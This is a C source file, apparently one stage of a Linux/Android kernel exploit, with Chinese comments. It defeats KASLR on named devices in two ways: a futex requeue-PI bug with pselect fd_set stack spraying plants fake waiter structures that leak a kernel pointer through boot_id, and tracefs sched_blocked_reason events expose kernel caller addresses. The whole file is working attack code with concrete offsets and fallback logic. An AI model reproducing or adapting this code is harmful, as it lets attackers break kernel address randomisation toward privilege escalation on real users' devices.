#include "common.h"

#define SLIDE_MAX_ATTEMPTS 40
#define SLIDE_PSELECT_NFDS PSELECT_ROUTE_NFDS
#define SLIDE_PSELECT_PAD_BYTES 0
#define SLIDE_PSELECT_WORD_SHIFT_BASE 0
#define SLIDE_WAIT_SECONDS 10

static uint32_t slide_f_wait;
static uint32_t slide_f_pi_target;
static uint32_t slide_f_pi_chain;
static atomic_int slide_waiter_ready;
static atomic_int slide_waiter_waiting;
static atomic_int slide_owner_started;
static atomic_int slide_route_done;
static atomic_int slide_waiter_tid;
static atomic_int slide_consume_go;
static atomic_int slide_consume_stop;
static atomic_int slide_consume_sched_ok;
static atomic_int slide_consume_calls;

static int slide_word_shift;

/* 线性别名平移量: target.h SLIDE_P0_OFFSET(shennong=0),可用 SLIDE_P0_OFFSET
 * 环境变量覆盖;data_addr()/p0_data_alias() 统一叠加此值。 */
uint64_t slide_p0_offset = SLIDE_P0_OFFSET;

void *slide_consumer_thread(void *arg __attribute__((unused)));

int slide_pselect_words_per_set(void) {
  int bits_per_word = (int)(8 * sizeof(unsigned long));
  return (SLIDE_PSELECT_NFDS + bits_per_word - 1) / bits_per_word;
}

int slide_pselect_global_word(int waiter_word) {
  return slide_word_shift + waiter_word;
}

int slide_pselect_put_global_word(
    fd_set *in, fd_set *out, fd_set *ex, int words_per_set,
    int global_word, uint64_t value) {
  if (global_word < 0) {
    return 0;
  }

  int set_idx = global_word / words_per_set;
  int word_idx = global_word % words_per_set;
  switch (set_idx) {
    case 0:
      fdset_put_word(in, word_idx, value);
      return 1;
    case 1:
      fdset_put_word(out, word_idx, value);
      return 1;
    case 2:
      fdset_put_word(ex, word_idx, value);
      return 1;
    default:
      return 0;
  }
}

uint64_t slide_pselect_get_global_word(
    const fd_set *in, const fd_set *out, const fd_set *ex,
    int words_per_set, int global_word) {
  if (global_word < 0) {
    return 0;
  }

  int set_idx = global_word / words_per_set;
  int word_idx = global_word % words_per_set;
  switch (set_idx) {
    case 0:
      return fdset_get_word(in, word_idx);
    case 1:
      return fdset_get_word(out, word_idx);
    case 2:
      return fdset_get_word(ex, word_idx);
    default:
      return 0;
  }
}

void slide_pselect_put_waiter_word(
    fd_set *in, fd_set *out, fd_set *ex, int words_per_set,
    int waiter_word, uint64_t value, const char *name) {
  int global_word = slide_pselect_global_word(waiter_word);
  int placed = slide_pselect_put_global_word(
      in, out, ex, words_per_set, global_word, value);
  if (!placed) {
    pr_warning("slide pselect cannot place %s waiter_word=%d global_word=%d "
               "words_per_set=%d nfds=%d\n",
               name, waiter_word, global_word, words_per_set,
               SLIDE_PSELECT_NFDS);
  }
}

static void prepare_slide_pselect_fdsets_shifted(
    fd_set *in, fd_set *out, fd_set *ex) {
  FD_ZERO(in);
  FD_ZERO(out);
  FD_ZERO(ex);

  int words_per_set = slide_pselect_words_per_set();
  struct slide_waiter_word {
    int word;
    uint64_t value;
    const char *name;
  } words[] = {
    /* 写/读目标一律走 data_addr()(= p0 别名 + slide_p0_offset),
     * 保证非零 slide 下 boot_id 写目标正确(在 tracefs 泄漏之后构建) */
    {0, data_addr(SLIDE_LOGGERS_0_1_IMAGE), "tree_pc"},
    {1, 0, "tree_right"},
    {2, data_addr(SLIDE_RANDOM_BOOT_ID_DATA_IMAGE), "tree_left"},
    {3, FAKE_WAITER_PRIO, "tree_prio"},
    {5, data_addr(SLIDE_LOGGERS_0_1_IMAGE), "pi0"},
    {6, 0, "pi1"},
    {7, data_addr(SLIDE_RANDOM_BOOT_ID_DATA_IMAGE), "pi2"},
    {8, FAKE_WAITER_PRIO, "pi_prio"},
    {9, 0, "pi_deadline"},
    {10, data_addr(SLIDE_INIT_TASK_IMAGE), "task"},
    {11, fake_lock, "lock"},
    {12, 3, "wake_state"},
    {13, 0, "ww_ctx"},
  };
  for (size_t i = 0; i < sizeof(words) / sizeof(words[0]); i++) {
    struct slide_waiter_word *w = &words[i];
    slide_pselect_put_waiter_word(
        in, out, ex, words_per_set, w->word, w->value, w->name);
  }
}

void open_slide_selected_fds(fd_set *in, fd_set *out, fd_set *ex, int read_fd) {
  for (int fd = 0; fd < SLIDE_PSELECT_NFDS; fd++) {
    if (FD_ISSET(fd, in) || FD_ISSET(fd, out) || FD_ISSET(fd, ex)) {
      dup2(read_fd, fd);
    }
  }
  dup2(read_fd, SLIDE_PSELECT_NFDS - 1);
  FD_SET(SLIDE_PSELECT_NFDS - 1, ex);
}

void slide_pselect_stack_copy(void) {
  if (!page_base || !fake_lock || !fake_w0) {
    pr_error("slide pselect missing kernel page base=%016zx lock=%016zx w0=%016zx\n",
             page_base, fake_lock, fake_w0);
    return;
  }

  int pipefd[2] = {-1, -1};
  SYSCHK(pipe(pipefd));
  int block_fd = (int)syscall(SYS_timerfd_create, CLOCK_MONOTONIC, 0);
  if (block_fd < 0) {
    pr_warning("slide timerfd_create failed errno=%d; using pipe read end\n",
               errno);
    block_fd = pipefd[0];
  }
  int high_read = fcntl(block_fd, F_DUPFD, SLIDE_PSELECT_NFDS + 16);
  if (high_read < 0) {
    pr_error("slide pselect F_DUPFD read errno=%d\n", errno);
    if (block_fd != pipefd[0]) {
      close(block_fd);
    }
    close(pipefd[0]);
    close(pipefd[1]);
    return;
  }

  fd_set in;
  fd_set out;
  fd_set ex;
  prepare_slide_pselect_fdsets_shifted(&in, &out, &ex);
  open_slide_selected_fds(&in, &out, &ex, high_read);

  struct timespec timeout = {
    .tv_sec = PSELECT_TIMEOUT_SEC,
    .tv_nsec = 0,
  };
  struct timespec *timeoutp = &timeout;

  atomic_store(&slide_consume_stop, 0);
  atomic_store(&slide_consume_go, 0);
  atomic_store(&slide_consume_sched_ok, 0);
  atomic_store(&slide_consume_calls, 0);
  pthread_t consumer;
  SYSCHK(pthread_create(&consumer, NULL, slide_consumer_thread, NULL));

  atomic_store(&slide_consume_go, 1);
  errno = 0;
  int ret = pselect(SLIDE_PSELECT_NFDS, &in, &out, &ex, timeoutp, NULL);
  int saved_errno = errno;
  atomic_store(&slide_consume_go, 0);
  pr_info("slide pselect returned ret=%d errno=%d shift=%d sched_ok=%d calls=%d\n",
          ret, saved_errno, slide_word_shift,
          atomic_load(&slide_consume_sched_ok),
          atomic_load(&slide_consume_calls));

  pthread_join(consumer, NULL);

  close(high_read);
  if (block_fd != pipefd[0]) {
    close(block_fd);
  }
  close(pipefd[0]);
  close(pipefd[1]);
}

static void slide_alarm_handler(int sig __attribute__((unused))) {
  syscall(SYS_setpriority, PRIO_PROCESS, 0, 5);
}

void *slide_consumer_thread(void *arg __attribute__((unused))) {
  disable_rseq_for_thread();
  pin_to_core(CONSUMER_CORE);

  for (;;) {
    int seq = atomic_load(&slide_consume_go);
    if (seq == 0) {
      __asm__ volatile("yield" ::: "memory");
      if (atomic_load(&slide_consume_stop)) {
        return NULL;
      }
      continue;
    }

    usleep(1000);

    int tid = atomic_load(&slide_waiter_tid);
    int calls = atomic_load(&slide_consume_calls);
    atomic_store(&slide_consume_calls, calls + 1);
    errno = 0;
    long ret = sched_setattr_tid(tid, PSELECT_CONSUMER_NICE);
    int call_errno = errno;
    if (ret == 0) {
      atomic_fetch_add(&slide_consume_sched_ok, 1);
    }
    pr_info("slide consumer sched tid=%d ret=%ld errno=%d sched_ok=%d\n",
            tid, ret, call_errno, atomic_load(&slide_consume_sched_ok));

    atomic_store(&slide_consume_stop, 1);
    while (atomic_load(&slide_consume_go)) {
      __asm__ volatile("yield" ::: "memory");
    }
    return NULL;
  }
}

void *slide_waiter_thread(void *arg __attribute__((unused))) {
  int tid = (int)SYSCHK(syscall(SYS_gettid));
  atomic_store(&slide_waiter_tid, tid);

  struct sigaction sa;
  memset(&sa, 0, sizeof(sa));
  sa.sa_handler = slide_alarm_handler;
  sigemptyset(&sa.sa_mask);
  sigaction(SIGALRM, &sa, NULL);

  sigset_t unblock;
  sigemptyset(&unblock);
  sigaddset(&unblock, SIGALRM);
  pthread_sigmask(SIG_UNBLOCK, &unblock, NULL);

  if (futex_op(&slide_f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0) {
    pr_error("slide waiter lock chain errno=%d\n", errno);
    return NULL;
  }

  atomic_store(&slide_waiter_ready, 1);
  while (!atomic_load(&slide_owner_started)) {
    usleep(1000);
  }

  struct timespec timeout;
  SYSCHK(clock_gettime(CLOCK_MONOTONIC, &timeout));
  timeout.tv_sec += SLIDE_WAIT_SECONDS;

  atomic_store(&slide_waiter_waiting, 1);
  futex_op(&slide_f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &timeout,
           &slide_f_pi_target, 0);
  futex_op(&slide_f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);

  signal(SIGALRM, SIG_DFL);

  slide_pselect_stack_copy();
  atomic_store(&slide_route_done, 1);

  for (;;) {
    sleep(1);
  }
}

void *slide_owner_thread(void *arg __attribute__((unused))) {
  if (futex_op(&slide_f_pi_target, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0) {
    pr_error("slide owner lock target errno=%d\n", errno);
    return NULL;
  }

  while (!atomic_load(&slide_waiter_ready)) {
    usleep(1000);
  }

  atomic_store(&slide_owner_started, 1);
  futex_op(&slide_f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0);

  for (;;) {
    sleep(1);
  }
}

int hex_value(char c) {
  if (c >= '0' && c <= '9') {
    return c - '0';
  }
  if (c >= 'a' && c <= 'f') {
    return c - 'a' + 10;
  }
  if (c >= 'A' && c <= 'F') {
    return c - 'A' + 10;
  }
  return -1;
}

uint64_t slide_read_stext(void) {
  char buf[64];
  unsigned char raw[16];
  int fd = open("/proc/sys/kernel/random/boot_id", O_RDONLY | O_CLOEXEC);
  if (fd < 0) {
    pr_warning("slide boot_id read denied errno=%d\n", errno);
    return 0;
  }

  ssize_t n = read(fd, buf, sizeof(buf) - 1);
  int saved_errno = errno;
  close(fd);
  if (n < 0) {
    pr_warning("slide boot_id read failed errno=%d\n", saved_errno);
    return 0;
  }
  buf[n] = 0;

  int nibble = -1;
  int out = 0;
  for (ssize_t i = 0; i < n && out < 16; i++) {
    int v = hex_value(buf[i]);
    if (v < 0) {
      continue;
    }
    if (nibble < 0) {
      nibble = v;
      continue;
    }
    raw[out++] = (unsigned char)((nibble << 4) | v);
    nibble = -1;
  }
  if (out != 16) {
    pr_warning("slide short boot_id parse out=%d n=%zd\n", out, n);
    return 0;
  }

  uint64_t leaked = 0;
  for (int i = 0; i < 8; i++) {
    leaked |= (uint64_t)raw[i] << (i * 8);
  }
  if ((leaked >> 48) != 0xffff) {
    pr_warning("slide bad leaked pointer=%016llx\n",
               (unsigned long long)leaked);
    return 0;
  }

  /* 必须与 words[] 写入的符号一致(SLIDE_LOGGERS_0_1,非 SLIDE_NFULNL_LOGGER,
   * 二者差 0xb8);且要加 KIMAGE-vs-线性映射 修正项,否则 stext 偏 0x80000000+0xb8
   * (S26 官方注释: old SLIDE_NFULNL_LOGGER formula poisons kaslr_base) */
  uint64_t off = p0_alias_image_offset(SLIDE_LOGGERS_0_1);
  uint64_t stext = leaked - off +
      (KIMAGE_TEXT_BASE - DIRECT_MAP_BASE - P0_KERNEL_PHYS_LOAD);
  pr_success("slide boot_id_leaked_nfulnl_logger pid=%d value=%016llx stext=%016llx\n",
             getpid(), (unsigned long long)leaked, (unsigned long long)stext);
  pr_success("slide boot_id-derived_stext pid=%d value=%016llx\n",
             getpid(), (unsigned long long)stext);
  return stext;
}

uint64_t slide_child_leak_stext(void) {
  sigset_t block;
  sigemptyset(&block);
  sigaddset(&block, SIGALRM);
  pthread_sigmask(SIG_BLOCK, &block, NULL);

  pthread_t waiter;
  pthread_t owner;
  SYSCHK(pthread_create(&waiter, NULL, slide_waiter_thread, NULL));
  SYSCHK(pthread_create(&owner, NULL, slide_owner_thread, NULL));

  while (!atomic_load(&slide_waiter_waiting) ||
         !atomic_load(&slide_owner_started)) {
    usleep(1000);
  }

  errno = 0;
  futex_op(&slide_f_wait, FUTEX_CMP_REQUEUE_PI, 1, (void *)1,
           &slide_f_pi_target, 0);

  usleep(50000);
  pthread_kill(waiter, SIGALRM);

  while (!atomic_load(&slide_route_done)) {
    sleep(1);
  }

  return slide_read_stext();
}

/* ================= tracefs sched_blocked_reason 主路线 =================
 * 参考 S26/m1q(三星)实机验证方法: 启用 sched_blocked_reason 事件后,空闲
 * kworker 在 worker_thread -> schedule 处阻塞,事件 caller 字段
 * (stack_trace_save_tsk 保存的返回 PC)是 worker_thread 内 `bl schedule`
 * 之后那条指令的运行时地址。slide = caller - (KIMAGE_TEXT_BASE +
 * SLIDE_TRACEFS_WORKER_CALLER_OFF)。shennong 真机已交叉验证:
 *   worker_thread caller=0xffffffd06fcda4ac,锚点 0xffffffc0080da4ac
 *   rcu caller        =0xffffffd06fd67b44,锚点 0xffffffc008167b44
 *   两者推出同一 slide=0x1067C00000(2MB 对齐)
 * 该路线在 boot_id-route words 构建之前运行,使 data_addr()(p0 别名 +
 * slide_p0_offset)在非零 slide 下仍指向正确写目标。零漏洞、零 panic 风险;
 * 失败自动回退 pselect/boot_id 路线。 */

#define SLIDE_TRACEFS_MAX_ROOTS 3
#define SLIDE_TRACEFS_MAX_CAND 8

static const char *slide_tracefs_roots[SLIDE_TRACEFS_MAX_ROOTS] = {
  "/sys/kernel/tracing",
  "/d/tracing",
  "/sys/kernel/debug/tracing",
};

struct slide_tracefs_cand {
  uint64_t slide;
  int count;
};

static int slide_tracefs_write(const char *path, const char *value) {
  int fd = open(path, O_WRONLY | O_CLOEXEC);
  if (fd < 0) {
    return 0;
  }
  size_t len = strlen(value);
  ssize_t wrote = write(fd, value, len);
  close(fd);
  return wrote == (ssize_t)len;
}

static int slide_tracefs_read_int(const char *path, int *out) {
  char buf[32];
  int fd = open(path, O_RDONLY | O_CLOEXEC);
  if (fd < 0) {
    return 0;
  }
  ssize_t n = read(fd, buf, sizeof(buf) - 1);
  close(fd);
  if (n <= 0) {
    return 0;
  }
  buf[n] = 0;
  *out = atoi(buf);
  return 1;
}

/* caller 与编译期锚点比对: 命中 worker_thread 或 rcu 锚点(64KB 对齐、限幅)
 * 则返回 slide,否则 0。 */
static uint64_t slide_tracefs_candidate(uint64_t caller) {
  if (caller < KIMAGE_TEXT_BASE) {
    return 0;
  }
  uint64_t d = caller - KIMAGE_TEXT_BASE;
  if (d >= SLIDE_TRACEFS_WORKER_CALLER_OFF) {
    uint64_t s = d - SLIDE_TRACEFS_WORKER_CALLER_OFF;
    if (s <= SLIDE_TRACEFS_MAX_SLIDE &&
        (s & (SLIDE_TRACEFS_ALIGN - 1)) == 0) {
      return s;
    }
  }
  if (d >= SLIDE_TRACEFS_RCU_CALLER_OFF) {
    uint64_t s = d - SLIDE_TRACEFS_RCU_CALLER_OFF;
    if (s <= SLIDE_TRACEFS_MAX_SLIDE &&
        (s & (SLIDE_TRACEFS_ALIGN - 1)) == 0) {
      return s;
    }
  }
  return 0;
}

static void slide_tracefs_note(struct slide_tracefs_cand *c, int *n,
                               uint64_t slide) {
  for (int i = 0; i < *n; i++) {
    if (c[i].slide == slide) {
      c[i].count++;
      return;
    }
  }
  if (*n < SLIDE_TRACEFS_MAX_CAND) {
    c[*n].slide = slide;
    c[*n].count = 1;
    (*n)++;
  }
}

/* 解析 trace_pipe_raw 单页(4096B): 页头 time_stamp@0 + commit@8,数据从
 * offset 16 起;事件记录 = 4B 头 + payload(payload 前 8B 为 trace_entry:
 * u16 type + u8 flags + u8 preempt_count + int pid)。TP_STRUCT__entry 从
 * payload+8 起。sched_blocked_reason 字段布局因内核而异:
 *   GKI 6.1: comm[16]@8 pid@24 why@28 caller@32
 *   三星变体: caller@16
 * 通用做法: 扫 payload+16..48 的 8B 对齐值,命中锚点即候选。 */
static int slide_tracefs_parse_page(const unsigned char *page, size_t page_len,
                                    int event_id,
                                    struct slide_tracefs_cand *cands,
                                    int *cand_cnt) {
  if (page_len < 20) {
    return 0;
  }
  uint64_t commit = 0;
  memcpy(&commit, page + 8, sizeof(commit));
  size_t data_len = (size_t)(commit & 0xfffULL);
  size_t end = 16 + data_len;
  if (end > page_len) {
    end = page_len;
  }

  int hits = 0;
  for (size_t pos = 16; pos + 4 <= end;) {
    uint32_t hdr = 0;
    memcpy(&hdr, page + pos, sizeof(hdr));
    uint32_t type_len = hdr & 0x1fU;
    if (type_len == 30) {       /* TIME_EXTEND */
      pos += 8;
      continue;
    }
    if (type_len == 31) {       /* TIME_STAMP */
      pos += 12;
      continue;
    }
    if (type_len == 0 || type_len >= 29) {
      break;
    }

    size_t rec_len = (size_t)type_len * 4;
    size_t rec = pos + 4;
    if (rec + rec_len > end) {
      break;
    }

    if (event_id > 0) {
      uint16_t id = 0;
      memcpy(&id, page + rec, sizeof(id));
      if (id != (uint16_t)event_id) {
        pos = rec + rec_len;
        continue;
      }
    }

    for (size_t off = 16; off + 8 <= rec_len && off <= 48; off += 8) {
      uint64_t v = 0;
      memcpy(&v, page + rec + off, sizeof(v));
      uint64_t s = slide_tracefs_candidate(v);
      if (s) {
        slide_tracefs_note(cands, cand_cnt, s);
        pr_success("slide tracefs caller=%016llx off=%zu slide=%08llx\n",
                   (unsigned long long)v, off, (unsigned long long)s);
        hits++;
      }
    }
    pos = rec + rec_len;
  }
  return hits > 0;
}

/* 文本 trace 兜底: ring buffer 布局无法解析时,从 trace 文本提取 16 位 hex
 * 内核地址再走锚点校验(符号化行 `SYM+0xOFF` 无绝对地址,自动跳过)。 */
static void slide_tracefs_parse_text(const char *path,
                                     struct slide_tracefs_cand *cands,
                                     int *cand_cnt) {
  FILE *f = fopen(path, "re");
  if (!f) {
    return;
  }
  char line[512];
  while (fgets(line, sizeof(line), f) != NULL) {
    const char *p = line;
    while ((p = strstr(p, "ffff")) != NULL) {
      int ok = 1;
      for (int i = 0; i < 12; i++) {
        char c = p[4 + i];
        if (!((c >= '0' && c <= '9') || (c >= 'a' && c <= 'f') ||
              (c >= 'A' && c <= 'F'))) {
          ok = 0;
          break;
        }
      }
      if (ok) {
        uint64_t v = strtoull(p, NULL, 16);
        uint64_t s = slide_tracefs_candidate(v);
        if (s) {
          slide_tracefs_note(cands, cand_cnt, s);
          pr_success("slide tracefs text caller=%016llx slide=%08llx\n",
                     (unsigned long long)v, (unsigned long long)s);
        }
      }
      p += 4;
    }
  }
  fclose(f);
}

/* 从候选集合选 slide: 出现次数最多者;>=2 次为强校验,仅 1 个样本则告警接受 */
static int slide_tracefs_pick(struct slide_tracefs_cand *cands, int cand_cnt,
                              uint64_t *slide_out) {
  if (cand_cnt == 0) {
    return 0;
  }
  int best = 0;
  for (int i = 1; i < cand_cnt; i++) {
    if (cands[i].count > cands[best].count) {
      best = i;
    }
  }
  for (int i = 0; i < cand_cnt; i++) {
    if (i != best && cands[i].slide != cands[best].slide) {
      pr_warning("slide tracefs conflicting candidates: %016llx(x%d) vs "
                 "%016llx(x%d)\n",
                 (unsigned long long)cands[best].slide, cands[best].count,
                 (unsigned long long)cands[i].slide, cands[i].count);
    }
  }
  if (cands[best].count < 2) {
    pr_warning("slide tracefs single sample, no cross-check\n");
  }
  *slide_out = cands[best].slide;
  return 1;
}

int slide_tracefs_leak_kernel_base(void) {
  const char *root = NULL;
  for (size_t i = 0; i < SLIDE_TRACEFS_MAX_ROOTS; i++) {
    char p[256];
    snprintf(p, sizeof(p), "%s/tracing_on", slide_tracefs_roots[i]);
    if (access(p, F_OK) == 0) {
      root = slide_tracefs_roots[i];
      break;
    }
  }
  if (!root) {
    pr_info("slide tracefs root not found\n");
    return 0;
  }

  char tracing_on[256];
  char event_enable[256];
  char id_path[256];
  char trace_path[256];
  char per_cpu[256];
  snprintf(tracing_on, sizeof(tracing_on), "%s/tracing_on", root);
  snprintf(event_enable, sizeof(event_enable),
           "%s/events/sched/sched_blocked_reason/enable", root);
  snprintf(id_path, sizeof(id_path),
           "%s/events/sched/sched_blocked_reason/id", root);
  snprintf(trace_path, sizeof(trace_path), "%s/trace", root);

  if (!slide_tracefs_write(tracing_on, "0") ||
      !slide_tracefs_write(event_enable, "1") ||
      !slide_tracefs_write(tracing_on, "1")) {
    pr_info("slide tracefs setup failed errno=%d\n", errno);
    return 0;
  }

  int event_id = 0;
  slide_tracefs_read_int(id_path, &event_id);
  pr_info("slide tracefs root=%s event_id=%d\n", root, event_id);

  int tf = open(trace_path, O_WRONLY | O_TRUNC | O_CLOEXEC);
  if (tf >= 0) {
    close(tf);
  }

  /* 让空闲 kworker 在 worker_thread -> schedule 阻塞产生事件 */
  usleep(1500000);
  slide_tracefs_write(tracing_on, "0");

  struct slide_tracefs_cand cands[SLIDE_TRACEFS_MAX_CAND];
  memset(cands, 0, sizeof(cands));
  int cand_cnt = 0;

  int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);
  for (int cpu = 0; cpu < cpu_count; cpu++) {
    snprintf(per_cpu, sizeof(per_cpu), "%s/per_cpu/cpu%d/trace_pipe_raw",
             root, cpu);
    int fd = open(per_cpu, O_RDONLY | O_NONBLOCK | O_CLOEXEC);
    if (fd < 0) {
      continue;
    }
    unsigned char page[4096];
    ssize_t got;
    while ((got = read(fd, page, sizeof(page))) > 0) {
      slide_tracefs_parse_page(page, (size_t)got, event_id, cands,
                               &cand_cnt);
    }
    close(fd);
  }
  slide_tracefs_write(event_enable, "0");

  if (cand_cnt == 0) {
    slide_tracefs_parse_text(trace_path, cands, &cand_cnt);
  }

  uint64_t slide = 0;
  if (!slide_tracefs_pick(cands, cand_cnt, &slide)) {
    pr_info("slide tracefs worker caller not found\n");
    return 0;
  }

  kaslr_base = KIMAGE_TEXT_BASE + slide;
  kaslr_slide = slide;
  kaslr_done = 1;
  /* shennong: 物理加载固定,线性别名不随 VA slide(slide_p0_offset 保持 0);
   * m1q 类机型(物理 KASLR)需在 target.h 将 SLIDE_P0_OFFSET 设为 slide 语义。 */
  pr_success("slide-kaslr-ok source=tracefs pid=%d base=%016llx "
             "slide=%016llx p0_offset=%08llx\n",
             getpid(), (unsigned long long)kaslr_base,
             (unsigned long long)kaslr_slide,
             (unsigned long long)slide_p0_offset);
  return 1;
}

int slide_leak_kernel_base(void) {
  /* 环境变量: SLIDE_P0_OFFSET 强制 p0 别名平移(物理 KASLR 排查用);
   * SLIDE_FORCE_BOOTID=1 在 tracefs 成功后仍跑 boot_id pselect 验证。 */
  slide_p0_offset = SLIDE_P0_OFFSET;
  const char *p0env = getenv("SLIDE_P0_OFFSET");
  if (p0env && *p0env) {
    char *end = NULL;
    errno = 0;
    unsigned long long v = strtoull(p0env, &end, 0);
    if (!errno && end && !*end && v <= SLIDE_TRACEFS_MAX_SLIDE) {
      slide_p0_offset = (uint64_t)v;
      pr_info("slide forced p0_offset=%08llx\n",
              (unsigned long long)slide_p0_offset);
    }
  }
  int force_bootid = 0;
  const char *fb = getenv("SLIDE_FORCE_BOOTID");
  if (fb && strcmp(fb, "1") == 0) {
    force_bootid = 1;
  }

  /* 主路线: tracefs sched_blocked_reason caller 泄漏。必须在任何 boot_id
   * words 使用之前运行,使 data_addr() = p0 别名 + slide_p0_offset 的
   * 数据别名写目标在非零 slide 下保持正确。 */
  if (slide_tracefs_leak_kernel_base()) {
    if (!force_bootid) {
      return 1;
    }
    pr_info("slide tracefs ok (slide=%016llx); forcing boot_id pselect "
            "route via SLIDE_FORCE_BOOTID\n",
            (unsigned long long)kaslr_slide);
  } else {
    pr_info("slide tracefs route unavailable, falling back to boot_id "
            "pselect\n");
  }

  int shifts[] = {0, 1, 2, 3, -1, -2};
  int n_shifts = sizeof(shifts) / sizeof(shifts[0]);

  for (int attempt = 1; attempt <= SLIDE_MAX_ATTEMPTS; attempt++) {
    slide_word_shift = shifts[(attempt - 1) % n_shifts];

    page_base = prepare_good_kernel_page(PAGE_PAYLOAD_SLIDE);
    if (!page_base || !fake_lock) {
      continue;
    }

    int raw_fds[2];
    SYSCHK(pipe(raw_fds));
    int fds[2];
    fds[0] = SYSCHK(fcntl(raw_fds[0], F_DUPFD, SLIDE_PSELECT_NFDS + 128));
    fds[1] = SYSCHK(fcntl(raw_fds[1], F_DUPFD, SLIDE_PSELECT_NFDS + 129));
    SYSCHK(close(raw_fds[0]));
    SYSCHK(close(raw_fds[1]));

    pid_t child = SYSCHK(fork());
    if (child == 0) {
      SYSCHK(close(fds[0]));
      disable_rseq_for_thread();
      log_slide_child_context();
      uint64_t stext = slide_child_leak_stext();
      if (stext) {
        SYSCHK(write(fds[1], &stext, sizeof(stext)));
        _exit(0);
      }
      _exit(1);
    }

    SYSCHK(close(fds[1]));
    uint64_t stext = 0;
    ssize_t n = read(fds[0], &stext, sizeof(stext));
    SYSCHK(close(fds[0]));
    int status = 0;
    SYSCHK(waitpid(child, &status, 0));

    if (n == (ssize_t)sizeof(stext) && WIFEXITED(status) &&
        WEXITSTATUS(status) == 0 && stext) {
      kaslr_base = stext;
      kaslr_slide = kaslr_base - KIMAGE_TEXT_BASE;
      kaslr_done = 1;
      pr_success("slide-kaslr-ok pid=%d base=%016llx slide=%016llx shift=%d\n",
                 getpid(), (unsigned long long)kaslr_base,
                 (unsigned long long)kaslr_slide, slide_word_shift);
      return 1;
    }

    pr_warning("slide attempt %d failed n=%zd status=%d shift=%d\n",
               attempt, n, status, slide_word_shift);
  }

  return 0;
}
